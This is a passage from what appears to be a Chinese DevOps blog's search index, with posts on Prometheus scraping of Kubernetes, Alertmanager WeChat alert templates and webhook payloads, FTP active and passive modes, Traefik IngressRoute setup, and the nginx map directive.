18:30","objectID":"/post/2180/:1:5","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"二、配置文件: # 抓取指标配置 # 抓取配置 scrape_configs: # 任务名称 - job_name: node_exporter kubernetes_sd_configs: # 通过node角色发现目标ip端口 - role: node # 重写标签 relabel_configs: # 将目标地址的端口改为node_exporter的端口 - source_labels: [__address__] regex: \"(.*):10250\" target_label: __address__ replacement: \"${1}:9100\" # 将正则匹配的标签名称，替换原标签名称.(replacement默认是$1),下面的内容就相当于将`__meta_kubernetes_node_label_xxxx`替换为xxxx - action: labelmap regex: \"__meta_kubernetes_node_label_(.*)\" # 任务名称，这里抓取的是kubelet的指标(默认10250端口)，可以通过curl获取: curl -k 'https://localhost:10250/metrics' --header 'Authorization: Bearer xxxxx' - job_name: 'kubernetes-kubelet' # 指定通过https还是http抓取指标，默认http scheme: https tls_config: # 用于验证API服务器证书的CA证书。 ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt # 如果证书是自签名的,则需要跳过校验 insecure_skip_verify: true # 访问metric api的token，这里对应的就是k8s的serviceaccount，权限可自行配置 bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) # 这里抓取的是cadvisor指标，提供容器相关的指标 - job_name: 'kubernetes-cadvisor' kubernetes_sd_configs: - role: node scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) # 修改__metrics_path__标签，会改变metrics的抓取路径。也可以使用kubelet-ip:10250/metrics/cadvisor来抓取 - action: replace source_labels: [__meta_kubernetes_node_name] regex: (.*) target_label: __metrics_path__ replacement: /api/v1/nodes/${1}/proxy/metrics/cadvisor - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default.svc:443 metric_relabel_configs: - regex: kernelVersion action: labeldrop # 监控api-server - job_name: 'kubernetes-api-services' scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: endpoints relabel_configs: - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default:443 - action: keep source_labels: [__meta_kubernetes_namespace,__meta_kubernetes_endpoint_port_name,__meta_kubernetes_service_name] regex: default;https;kubernetes - action: labelmap regex: __meta_kubernetes_(.+) # 获取kube-state-metrics提供的指标 - job_name: 'kubernetes-service-endpoints' kubernetes_sd_configs: - role: endpoints relabel_configs: # 保留__meta_kubernetes_service_annotation_prometheus_io_scrape=true的标签 - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape] action: keep regex: true # 将__address__的端口替换为注解中指定的端口 - action: replace source_labels: [__address__,__meta_kubernetes_service_annotation_prometheus_io_port] target_label: __address__ regex: (.*?):(\\d+);(\\d+) replacement: ${1}:${3} # 获取scheme,并将匹配的结果写入__scheme__标签中 - action: replace source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scheme] target_label: __scheme__ regex: (https?) # 将__metrics_path__的结果替换为注解中的metrics指定的路径 - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path] action: replace target_label: __metrics_path__ regex: (.+) - action: labelmap regex: __meta_kubernetes_service_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_service_name] action: replace target_label: kubernetes_name # 抓取nginx-ingress的metrics - job_name: 'ingress-nginx' bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: service namespaces: names: - ingress-nginx relabel_configs: - source_labels: [__address__] regex: (.*)10254 action: keep 官方示例Prometheus配置文件：https://github.com/prometheus/prometheus/blob/release-2.23/documentation/examples/prometheus-kubernetes.yml ","date":"2021-01-04 18:30","objectID":"/post/2180/:2:0","tags":["k8s","prometheus"],"title":"prometheus监控kubernetes集群配置详解(七)","uri":"/post/2180/"},{"categories":["监控"],"content":"一、promethues告警配置: alerting和rules的配置(抓取指标需自行配置)： global: scrape_interval: 15s evaluation_interval: 15s alerting: alertmanagers: - static_configs: - targets: [\"alertmanager:9093\"] rule_files: - \"/etc/prometheus/rules.yml\" /etc/prometheus/rules.yml的配置： groups: - name: linux_alert rules: - alert: \"load5负载高于5\" for: 20s expr: node_load5 \u003e 5 labels: severity: critical team: ops annotations: description: \"{{ $labels.instance }} 高于5,当前值:{{ $value }}\" summary: \"load5负载高于5\" ","date":"2021-01-04 12:58","objectID":"/post/1604/:1:0","tags":["prometheus","alertmanager"],"title":"alertmanager配置企业微信告警(六)","uri":"/post/1604/"},{"categories":["监控"],"content":"二、alertmanager配置 templates: - '/etc/alertmanager/*.tmpl' global: resolve_timeout: 5m route: group_by: ['alertname', 'cluster'] group_wait: 15s group_interval: 1m repeat_interval: 30m receiver: default routes: - receiver: wechat match: severity: critical receivers: - name: 'wechat' wechat_configs: - send_resolved: true api_secret: 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' # 在企业微信后台应用中查看 corp_id: 'xxxxxxxxxxxxxx' # 我的企业-企业信息-企业ID agent_id: '1000008' # 应用i,在企业微信后台应用中查看 to_party: '7' # 发送给哪个部门,部门需要对应用有权限 message: '{{ template \"wechat.tmpl\" . }}' # 发送的内容,这里调用的wechat.tmpl模板，后面会定义这个模板 ","date":"2021-01-04 12:58","objectID":"/post/1604/:2:0","tags":["prometheus","alertmanager"],"title":"alertmanager配置企业微信告警(六)","uri":"/post/1604/"},{"categories":["监控"],"content":"告警模板 /etc/alertmanager/wechat.tmpl {{ define \"__alert_list\" }}{{ range . -}} 告警名称: {{ index .Annotations \"summary\" }} 告警级别: {{ .Labels.severity }} 告警主机: {{ .Labels.instance }} 告警信息: {{ index .Annotations \"description\" }} 维护团队: {{ .Labels.team | toUpper }} 告警时间: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"__resolved_list\" }}{{ range . -}} 告警名称: {{ index .Annotations \"summary\" }} 告警级别: {{ .Labels.severity }} 告警主机: {{ .Labels.instance }} 告警信息: {{ index .Annotations \"description\" }} 维护团队: {{ .Labels.team | toUpper }} 告警时间: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} 恢复时间: {{ .EndsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"wechat.tmpl\" }} {{- if gt (len .Alerts.Firing) 0 -}} ====侦测到{{ .Alerts.Firing | len }}个故障==== {{ template \"__alert_list\" .Alerts.Firing }} {{ end -}} {{- if gt (len .Alerts.Resolved) 0 -}} ====恢复{{ .Alerts.Resolved | len }}个故障==== {{ template \"__resolved_list\" .Alerts.Resolved }} {{- end -}} {{ end }} ","date":"2021-01-04 12:58","objectID":"/post/1604/:2:1","tags":["prometheus","alertmanager"],"title":"alertmanager配置企业微信告警(六)","uri":"/post/1604/"},{"categories":["监控"],"content":"三、告警效果 75746-9y5p8vha7hr.png ","date":"2021-01-04 12:58","objectID":"/post/1604/:3:0","tags":["prometheus","alertmanager"],"title":"alertmanager配置企业微信告警(六)","uri":"/post/1604/"},{"categories":["监控"],"content":"告警 { \"receiver\":\"ops\", \"status\":\"firing\", \"alerts\":[ { \"status\":\"firing\", \"labels\":{ \"alertname\":\"load5负载高于5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-master\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-master\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-master 高于5,当前值:0.56\", \"summary\":\"load5负载高于5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"0001-01-01T00:00:00Z\", \"generatorURL\":\"http://xxx.com/graph?g0.expr=node_load5+%3E+0\u0026amp;g0.tab=1\" }, { \"status\":\"firing\", \"labels\":{ \"alertname\":\"load5负载高于5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node1\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node1\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node1 高于5,当前值:1.42\", \"summary\":\"load5负载高于5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"0001-01-01T00:00:00Z\", \"generatorURL\":\"http://xxx.com/graph?g0.expr=node_load5+%3E+0\u0026amp;g0.tab=1\" }, { \"status\":\"firing\", \"labels\":{ \"alertname\":\"load5负载高于5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node2\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node2\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node2 高于5,当前值:0.16\", \"summary\":\"load5负载高于5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"0001-01-01T00:00:00Z\", \"generatorURL\":\"http://xxx.com/graph?g0.expr=node_load5+%3E+0\u0026amp;g0.tab=1\" } ], \"groupLabels\":{ \"alertname\":\"load5负载高于5\" }, \"commonLabels\":{ \"alertname\":\"load5负载高于5\", \"severity\":\"critical\", \"team\":\"ops\" }, \"commonAnnotations\":{ \"summary\":\"load5负载高于5\" }, \"externalURL\":\"http://alertmanager-57fffcb99c-kjhcj:9093\", \"version\":\"4\", \"groupKey\":\"{}/{severity=\\\"critical\\\"}:{alertname=\\\"load5负载高于5\\\"}\" } ","date":"2020-12-30 13:08","objectID":"/post/2169/:0:1","tags":["prometheus","alertmanager"],"title":"alertmanager-webhook发送告警\u0026amp;恢复信息的请求体","uri":"/post/2169/"},{"categories":["监控"],"content":"恢复 { \"receiver\":\"ops\", \"status\":\"resolved\", \"alerts\":[ { \"status\":\"resolved\", \"labels\":{ \"alertname\":\"load5负载高于5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-master\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-master\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-master 高于5,当前值:0.09\", \"summary\":\"load5负载高于5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"2020-12-30T06:07:49.455639638Z\", \"generatorURL\":\"http://119.3.44.21:30002/graph?g0.expr=node_load5+%3E+5\u0026amp;g0.tab=1\" }, { \"status\":\"resolved\", \"labels\":{ \"alertname\":\"load5负载高于5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node1\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node1\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node1 高于5,当前值:0.61\", \"summary\":\"load5负载高于5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"2020-12-30T06:07:49.455639638Z\", \"generatorURL\":\"http://119.3.44.21:30002/graph?g0.expr=node_load5+%3E+5\u0026amp;g0.tab=1\" }, { \"status\":\"resolved\", \"labels\":{ \"alertname\":\"load5负载高于5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node2\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node2\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node2 高于5,当前值:0.4\", \"summary\":\"load5负载高于5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"2020-12-30T06:07:49.455639638Z\", \"generatorURL\":\"http://119.3.44.21:30002/graph?g0.expr=node_load5+%3E+5\u0026amp;g0.tab=1\" } ], \"groupLabels\":{ \"alertname\":\"load5负载高于5\" }, \"commonLabels\":{ \"alertname\":\"load5负载高于5\", \"severity\":\"critical\", \"team\":\"ops\" }, \"commonAnnotations\":{ \"summary\":\"load5负载高于5\" }, \"externalURL\":\"http://alertmanager-57fffcb99c-kjhcj:9093\", \"version\":\"4\", \"groupKey\":\"{}/{severity=\\\"critical\\\"}:{alertname=\\\"load5负载高于5\\\"}\" } ","date":"2020-12-30 13:08","objectID":"/post/2169/:0:2","tags":["prometheus","alertmanager"],"title":"alertmanager-webhook发送告警\u0026amp;恢复信息的请求体","uri":"/post/2169/"},{"categories":["监控"],"content":"一、告警模板 alertmanager是可以自定义告警模板的。 注意钉钉需要部署prometheus-webhook-dingtalk，这个也是支持模板的，但是模板要写在prometheus-webhook-dingtalk里，而不是alertmanager 项目链接https://github.com/timonwong/prometheus-webhook-dingtalk 通过配置templates参数,指定模板位置。详细可以看我上一篇文章 下面是一个模板示例(网上copy的): vim /etc/alertmanager/template/wechat.tmpl {{- define \"wechat.tmpl\" }} {{- range $i, $alert := .Alerts.Firing -}} [报警项]:{{ index $alert.Labels \"alertname\" }} [实例]:{{ index $alert.Labels \"instance\" }} [job]:{{ index $alert.Labels \"job\" }} [报警内容]:{{ index $alert.Annotations \"summary\" }} [开始时间]:{{ $alert.StartsAt.Format \"2006-01-02 15:04:05\" }} ==================== {{- end }} {{- end }} define: 定义模板名称 range: 循环遍历 index: 通过key取值 ","date":"2020-12-30 10:10","objectID":"/post/2168/:1:0","tags":["prometheus","alertmanager"],"title":"alertmanager自定义告警模板(五)","uri":"/post/2168/"},{"categories":["监控"],"content":"二、数据结构介绍 ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:0","tags":["prometheus","alertmanager"],"title":"alertmanager自定义告警模板(五)","uri":"/post/2168/"},{"categories":["监控"],"content":"1.Data .Receiver: 接收器的名称 .Status : 如果存在告警,则为firing,否则resolved(恢复)。 .Alerts : 所有告警对象(alert对象)的列表。(另外他还提供了两个函数用于过滤告警和恢复列表Alerts.Firing:代表告警列表,Alerts.Resolved:代表恢复列表),告警对象的数据结构可以看下面alert部分 .GroupLabels: 告警的分组标签(没猜错应该是对应配置文件的group_by) .CommonLabels: 所有告警共有的标签 .CommonAnnotations: 所有告警共有的注解 .ExternalURL: 告警对应的alertmanager链接地址 ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:1","tags":["prometheus","alertmanager"],"title":"alertmanager自定义告警模板(五)","uri":"/post/2168/"},{"categories":["监控"],"content":"2.Alert: 看这个之前可以先了解上面的Alerts Status: 当前这一条报警的状态。firing(告警)或resolved(恢复) Labels: 当前这一条报警的标签 Annotations: 当前这一条报警的注解 StartsAt: 当前这一条报警的开始时间 EndsAt: 当前这一条报警的结束时间 GeneratorURL: 告警对应的alertmanager链接地址 ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:2","tags":["prometheus","alertmanager"],"title":"alertmanager自定义告警模板(五)","uri":"/post/2168/"},{"categories":["监控"],"content":"3. kv数据的一些内置方法 kv数据相当于python里的字典，在模板中提供了一些方法可以操作kv数据 SortedPairs: 排序 Remove : 删除一个key Names: 返回标签集中标签名的名称列表。 Values: 返回标签集中标签名的值列表。 ","date":"2020-12-30 10:10","objectID":"/post/2168/:2:3","tags":["prometheus","alertmanager"],"title":"alertmanager自定义告警模板(五)","uri":"/post/2168/"},{"categories":["监控"],"content":"4.go模板常用内置函数 title: 将字符串转换为首字母大写的标题 toUpper: 字母转换成大写 toLower: 字母转换成小写 match: 使用正则匹配字符串 reReplaceAll: 使用正则替换字符串 join: 连接字符串用法{{ .CommonLabels.SortedPairs.Values | join \",\" }} safeHtml: 将字符串标记为不需要自动转义的HTML 详细的数据类型介绍:https://prometheus.io/docs/alerting/latest/notifications/ 下面不知道是哪个大佬写的,可以参考一下: {{ define \"__subject\" }}[{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}] {{ .GroupLabels.SortedPairs.Values | join \" \" }} {{ if gt (len .CommonLabels) (len .GroupLabels) }}({{ with .CommonLabels.Remove .GroupLabels.Names }}{{ .Values | join \" \" }}{{ end }}){{ end }}{{ end }} {{ define \"__alertmanagerURL\" }}{{ .ExternalURL }}/#/alerts?receiver={{ .Receiver }}{{ end }} {{ define \"__text_alert_list\" }}{{ range . }} **Labels** {{ range .Labels.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **Annotations** {{ range .Annotations.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **Source:** [{{ .GeneratorURL }}]({{ .GeneratorURL }}) {{ end }}{{ end }} {{ define \"default.__text_alert_list\" }}{{ range . }} --- **告警级别:** {{ .Labels.severity | upper }} **运营团队:** {{ .Labels.team | upper }} **触发时间:** {{ dateInZone \"2006.01.02 15:04:05\" (.StartsAt) \"Asia/Shanghai\" }} **事件信息:** {{ range .Annotations.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **事件标签:** {{ range .Labels.SortedPairs }}{{ if and (ne (.Name) \"severity\") (ne (.Name) \"summary\") (ne (.Name) \"team\") }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }}{{ end }} {{ end }} {{ end }} {{ define \"default.__text_alertresovle_list\" }}{{ range . }} --- **告警级别:** {{ .Labels.severity | upper }} **运营团队:** {{ .Labels.team | upper }} **触发时间:** {{ dateInZone \"2006.01.02 15:04:05\" (.StartsAt) \"Asia/Shanghai\" }} **结束时间:** {{ dateInZone \"2006.01.02 15:04:05\" (.EndsAt) \"Asia/Shanghai\" }} **事件信息:** {{ range .Annotations.SortedPairs }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }} **事件标签:** {{ range .Labels.SortedPairs }}{{ if and (ne (.Name) \"severity\") (ne (.Name) \"summary\") (ne (.Name) \"team\") }}\u003e - {{ .Name }}: {{ .Value | markdown | html }} {{ end }}{{ end }} {{ end }} {{ end }} {{/* Default */}} {{ define \"default.title\" }}{{ template \"__subject\" . }}{{ end }} {{ define \"default.content\" }}#### \\[{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}\\] **[{{ index .GroupLabels \"alertname\" }}]({{ template \"__alertmanagerURL\" . }})** {{ if gt (len .Alerts.Firing) 0 -}} ![警报 图标](https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3626076420,1196179712\u0026fm=15\u0026gp=0.jpg) **====侦测到故障====** {{ template \"default.__text_alert_list\" .Alerts.Firing }} {{- end }} {{ if gt (len .Alerts.Resolved) 0 -}} {{ template \"default.__text_alertresovle_list\" .Alerts.Resolved }} {{- end }} {{- end }} {{/* Legacy */}} {{ define \"legacy.title\" }}{{ template \"__subject\" . }}{{ end }} {{ define \"legacy.content\" }}#### \\[{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}\\] **[{{ index .GroupLabels \"alertname\" }}]({{ template \"__alertmanagerURL\" . }})** {{ template \"__text_alert_list\" .Alerts.Firing }} {{- end }} {{/* Following names for compatibility */}} {{ define \"ding.link.title\" }}{{ template \"default.title\" . }}{{ end }} {{ define \"ding.link.content\" }}{{ template \"default.content\" . }}{{ end }} 下面是我写的一个小例子: {{ define \"__subject\" }} [{{ .Status | toUpper }}{{ if eq .Status \"firing\" }}:{{ .Alerts.Firing | len }}{{ end }}] {{ end }} {{ define \"__alert_list\" }}{{ range . }} --- **告警名称**: {{ index .Annotations \"summary\" }} **告警级别**: {{ .Labels.severity }} **告警主机**: {{ .Labels.instance }} **告警信息**: {{ index .Annotations \"description\" }} **维护团队**: {{ .Labels.team | upper }} **告警时间**: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} {{ end }}{{ end }} {{ define \"__resolved_list\" }}{{ range . }} --- **告警名称**: {{ index .Annotations \"summary\" }} **告警级别**: {{ .Labels.severity }} **告警主机**: {{ .Labels.instance }} **告警信息**: {{ index .Annotations \"d","date":"2020-12-30 10:10","objectID":"/post/2168/:2:4","tags":["prometheus","alertmanager"],"title":"alertmanager自定义告警模板(五)","uri":"/post/2168/"},{"categories":["系统服务"],"content":"原文:https://www.huaweicloud.com/zhishi/2006281029.html ","date":"2020-12-29 09:38","objectID":"/post/2160/:0:0","tags":["vsftpd","ftp"],"title":"ftp主动模式和被动模式的区别","uri":"/post/2160/"},{"categories":["系统服务"],"content":"1、主动模式 客户端从一个任意的非特权端口N（N\u003e1023）连接到FTP服务器的21端口。然后客户端开始监听N+1（如下图的1027端口），并发送FTP命令“port N+1”到FTP服务器。接着服务器会从它自己的数据端口（20）连接到客户端指定的数据端口（N+1）。 用更通俗的语言来理解这个交互过程： 1） 客户端用一个大于1024的端口N与FTP服务器的21端口建立一个控制通道，发送一条命令告诉FTP服务端（即通常说的PORT命令），我的数据通道的通信地址是IP1（本机网卡IP），数据通道的端口N+1，服务端收到请求后回复ACK确认。 2） 服务端确认后，用源端口20主动与客户端IP1:N+1建立连接，进行数据通信。 71329-og9czewmrpo.png ","date":"2020-12-29 09:38","objectID":"/post/2160/:1:0","tags":["vsftpd","ftp"],"title":"ftp主动模式和被动模式的区别","uri":"/post/2160/"},{"categories":["系统服务"],"content":"2、被动模式 当开启一个FTP连接时，客户端打开两个任意的非特权本地端口N\u003e1024和N+1（分别如下图的1026端口和1027端口）。第一个端口连接服务器的21端口，客户端提交PASV命令给服务端，这样做的结果是服务器会开启一个任意的非特权端口（P\u003e1024），并发送PORT P（如下图2024）命令给客户端。然后客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。 用更通俗的语言来理解这个交互过程： 1） 客户端使用源端口N与FTP服务端建立一个控制通道，发送一条命令告诉服务端（即通常说的PASV命令），我将使用被动模式与你通信。服务端收请求后，会告知客户端我的IP是IP2（默认为主机网卡IP）和监听端口P，你可以和我的这个IP和端口通信。 2） 客户端收到1）中的信息后，使用源端口N+1，与服务端IP2:P建立连接，进行数据通信。 27657-e4fu5a5zgeh.png ","date":"2020-12-29 09:38","objectID":"/post/2160/:2:0","tags":["vsftpd","ftp"],"title":"ftp主动模式和被动模式的区别","uri":"/post/2160/"},{"categories":["系统服务","kubernetes"],"content":"IngressRoute是traefik编写的一个自定义资源(CRD),可以更好的配置traefik所需的路由信息 https://doc.traefik.io/traefik/reference/dynamic-configuration/kubernetes-crd/#resources ","date":"2020-12-28 15:53","objectID":"/post/2159/:0:0","tags":["k8s","traefik"],"title":"traefik-IngressRoute基本配置(二)","uri":"/post/2159/"},{"categories":["系统服务","kubernetes"],"content":"一、使用helm安装traefik 1.添加traefik仓库 helm repo add traefik https://helm.traefik.io/traefik helm repo update 2.安装traefik kubectl create ns traefik-v2 helm install --namespace=traefik-v2 traefik traefik/traefik 3.暴露traefik的dashboard 端口说明: 9000是dashboard 8000是http入口 8443是https入口 kubectl port-forward --address=0.0.0.0 -n traefik-v2 $(kubectl get pods -n traefik-v2 --selector \"app.kubernetes.io/name=traefik\" --output=name) 9000:9000 通过master节点IP:9000/dashboard/访问traefik仪表盘 以上安装方式仅为学习使用. 58456-zpguelkyx.png ","date":"2020-12-28 15:53","objectID":"/post/2159/:1:0","tags":["k8s","traefik"],"title":"traefik-IngressRoute基本配置(二)","uri":"/post/2159/"},{"categories":["系统服务","kubernetes"],"content":"二、traefik IngressRoute资源配置 下面有一个nginx应用 apiVersion: apps/v1 kind: Deployment metadata: name: nginx-test namespace: kube-ops spec: selector: matchLabels: app: nginx test: \"true\" template: metadata: labels: app: nginx test: \"true\" spec: containers: - name: nginx-test ports: - name: http containerPort: 80 image: nginx:1.17.10 --- apiVersion: v1 kind: Service metadata: name: nginx-test namespace: kube-ops spec: selector: app: nginx test: \"true\" type: ClusterIP ports: - name: web port: 80 targetPort: http 让我们通过IngressRoute来配置一个规则 apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: nginx-test namespace: kube-ops spec: entryPoints: # 指定入口点为web。这里的web就是traefik静态配置(启动参数)中的 --entryPoints.web.address=:8000,通过仪表盘也可以看到 - web routes: - kind: Rule match: Host(`test.com`) # 匹配规则,第三部分说明 services: - name: nginx-test port: 80 可以看到我门刚才配置的规则已经生效了。 88637-g703qcu4v6.png 现在将入口点web暴露出来，通过9001端口。 kubectl port-forward --address=0.0.0.0 -n traefik-v2 $(kubectl get pods -n traefik-v2 --selector \"app.kubernetes.io/name=traefik\" --output=name) 9001:8000 在本地做hosts解析 x.x.x.x test.com 现在我们打开test.com:9001可以看到nginx已经正常访问 40593-17h09vnq5qx.png ","date":"2020-12-28 15:53","objectID":"/post/2159/:2:0","tags":["k8s","traefik"],"title":"traefik-IngressRoute基本配置(二)","uri":"/post/2159/"},{"categories":["系统服务","kubernetes"],"content":"三、路由匹配规则 Headers(`key`, `value`): 判断请求头是否存在，key是请求头名称，value是值 HeadersRegexp(`key`, `regexp`): 同上,可以使用正则来匹配 Host(`example.com`, …): 检查请求Host请求头,判断其值是否为给定之一 HostHeader(`example.com`, …): 同上 HostRegexp(`example.com`, `{subdomain:[a-z]+}.example.com`, …): 同上，可以使用正则 Method(`GET`, …): 检查请求方法是否为给定的一个methods（GET，POST，PUT，DELETE，PATCH） Path(`/path`, `/articles/{cat:[a-z]+}/{id:[0-9]+}`, …): 匹配确切的请求路径。接受正则表达式 PathPrefix(`/products/`, `/articles/{cat:[a-z]+}/{id:[0-9]+}`): 匹配请求前缀路径。接受正则表达式 Query(`foo=bar`, `bar=baz`): 匹配查询字符串参数 注意点: 为了与Host和Path表达式一起使用正则表达式，必须声明一个任意命名的变量，后跟用冒号分隔的正则表达式，所有这些都用花括号括起来。例如/posts/{id:[0-9]+},id为变量名 您可以使用AND（\u0026\u0026）和OR（||）运算符组合多个匹配器。您也可以使用括号。 规则评估后可以使用中间件，在请求被转发到服务之前对规则进行评估 ","date":"2020-12-28 15:53","objectID":"/post/2159/:3:0","tags":["k8s","traefik"],"title":"traefik-IngressRoute基本配置(二)","uri":"/post/2159/"},{"categories":["系统服务","kubernetes"],"content":"四、https配置 生成证书secret kubectl create secret tls nginx-test --cert=tls.crt --key=tls.key 修改之前的IngressRoute apiVersion: traefik.containo.us/v1alpha1 kind: IngressRoute metadata: name: nginx-test namespace: kube-ops spec: entryPoints: # 指定入口点为web。这里的web就是traefik静态配置(启动参数)中的 --entryPoints.web.address=:8000,通过仪表盘也可以看到 - web routes: - kind: Rule match: Host(`test.com`) # 匹配规则,第三部分说明 services: - name: nginx-test port: 80 tls: secretName: nginx-test 因为不是正常的证书,所以访问过不去 54073-f0d04jeun5l.png ","date":"2020-12-28 15:53","objectID":"/post/2159/:4:0","tags":["k8s","traefik"],"title":"traefik-IngressRoute基本配置(二)","uri":"/post/2159/"},{"categories":["kubernetes","云原生"],"content":"Traefik中的配置可以引用两种不同的内容： 路由配置（称为动态配置）路由的配置 启动配置（称为静态配置）traefik本身的配置 ","date":"2020-12-28 15:25","objectID":"/post/2158/:0:0","tags":["traefik"],"title":"traefik2配置简介(一)","uri":"/post/2158/"},{"categories":["kubernetes","云原生"],"content":"一、动态配置 traefik从providers动态获取路由配置信息 providers包括：docker,kubernetes-Ingress,kubernetes-IngressRoute,rancher,consul,zookeeper等等 动态配置的文档: https://doc.traefik.io/traefik/routing/overview/ ","date":"2020-12-28 15:25","objectID":"/post/2158/:1:0","tags":["traefik"],"title":"traefik2配置简介(一)","uri":"/post/2158/"},{"categories":["kubernetes","云原生"],"content":"二、静态配置 在traefik中定义了三种不同的定义方式（只能同时使用一种方式）： 在配置文件中 在命令行参数 在环境变量中 优先级按照上面的顺序 ","date":"2020-12-28 15:25","objectID":"/post/2158/:2:0","tags":["traefik"],"title":"traefik2配置简介(一)","uri":"/post/2158/"},{"categories":["kubernetes","云原生"],"content":"配置文件位置 在启动时,traefik搜索一个名为traefik.toml(或traefik.yml或traefik.yaml)的文件 搜索路径如下: /etc/traefik/ $XDG_CONFIG_HOME/ $HOME/.config/ . 当前工作目录 也可以使用命令行参数来配置 traefik --configFile=foo/bar/myconfigfile.toml ","date":"2020-12-28 15:25","objectID":"/post/2158/:2:1","tags":["traefik"],"title":"traefik2配置简介(一)","uri":"/post/2158/"},{"categories":["系统服务"],"content":"语法:map string $variable { ... } 配置字段:http 含义: 匹配第一个参数,将自己指定的结果赋值给第二个参数 举例: 如果$http_user_agent的值与~Opera Mini匹配成功，$mobile的值就是1。否则$mobile的值就是0 map $http_user_agent $mobile { default 0; \"~Opera Mini\" 1; } 